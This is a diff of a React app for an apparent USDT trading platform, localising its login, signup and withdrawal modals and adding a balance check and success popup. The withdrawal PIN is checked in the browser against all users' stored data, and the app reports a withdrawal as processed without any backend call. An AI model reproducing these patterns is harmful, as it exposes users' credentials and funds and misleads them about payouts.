+        <div className="modal-overlay"><div className="modal-content"><button className="close-btn" onClick={() => setShowAuth(false)}>×</button><h2>{authMode === 'login' ? t('login') : t('signUp')}</h2>
           {isLoadingUsers ? (
             <div style={{ textAlign: 'center', padding: '20px' }}>
               <div style={{ fontSize: '24px', marginBottom: '10px' }}>🔄</div>
-              <div>Loading user data...</div>
+              <div>{t('loadingUserData')}</div>
             </div>
           ) : (
             <form onSubmit={handleAuth}>
@@ -630,18 +1161,23 @@ function App() {
               <input className="login-input" type="email" placeholder="Email" required onChange={e => setAuthData({...authData, email: e.target.value})} />
               <input className="login-input" type="password" placeholder="Password" required onChange={e => setAuthData({...authData, password: e.target.value})} />
               {authMode === 'signup' && <input className="login-input" maxLength="4" placeholder="Withdrawal PIN (4 digits)" required onChange={e => setAuthData({...authData, pin: e.target.value})} />}
-              <button className="buy-btn" type="submit" disabled={isLoadingUsers}>{authMode === 'login' ? 'Sign In' : 'Register'}</button>
+              <button className="buy-btn" type="submit" disabled={isLoadingUsers}>{authMode === 'login' ? t('login') : t('signUp')}</button>
             </form>
           )}
-          <p onClick={() => setAuthMode(authMode === 'login' ? 'signup' : 'login')} className="toggle-auth">{authMode === 'login' ? 'Create Account' : 'Back to Login'}</p></div></div>
+          <p onClick={() => setAuthMode(authMode === 'login' ? 'signup' : 'login')} className="toggle-auth">{authMode === 'login' ? t('createAccount') : t('backToLogin')}</p></div></div>
       )}
 
       {showWithdraw && (
-        <div className="modal-overlay"><div className="modal-content"><button className="close-btn" onClick={() => setShowWithdraw(false)}>×</button><h2>Withdraw Assets</h2>
-          <input className="login-input" type="number" placeholder="Amount (USDT)" />
+        <div className="modal-overlay"><div className="modal-content"><button className="close-btn" onClick={() => setShowWithdraw(false)}>×</button><h2>{t('withdrawAssets')}</h2>
+          <input className="login-input" type="number" value={withdrawAmount} onChange={(e) => setWithdrawAmount(e.target.value)} placeholder="Amount (USDT)" />
           <input className="login-input" placeholder="Wallet Address (TRC20)" />
           <input className="login-input" type="password" maxLength="4" placeholder="Security PIN" onChange={e => setWithdrawPin(e.target.value)} />
-          <button className="buy-btn" onClick={() => { if(withdrawPin === allUsers[activeId].pin) {alert("Request Submitted"); setShowWithdraw(false);} else {alert("Wrong PIN");} }}>Verify & Submit</button></div></div>
+          {Number(withdrawAmount) > allUsers[activeId].balance && <div className="error-message">Insufficient Balance</div>}
+          <button className="buy-btn" disabled={Number(withdrawAmount) > allUsers[activeId].balance} onClick={() => { if(withdrawPin === allUsers[activeId].pin) {setWithdrawSuccess(true); setShowWithdraw(false); setWithdrawAmount(''); setWithdrawPin('');} else {alert("Wrong PIN");} }}>{t('verifySubmit')}</button></div></div>
+      )}
+
+      {withdrawSuccess && (
+        <div className="modal-overlay"><div className="modal-content success-modal"><button className="close-btn" onClick={() => setWithdrawSuccess(false)}>×</button><h2>Withdraw Submission Successful</h2><p>Your withdrawal request has been submitted and is being processed.</p></div></div>
       )}
 
       {showAdmin && (
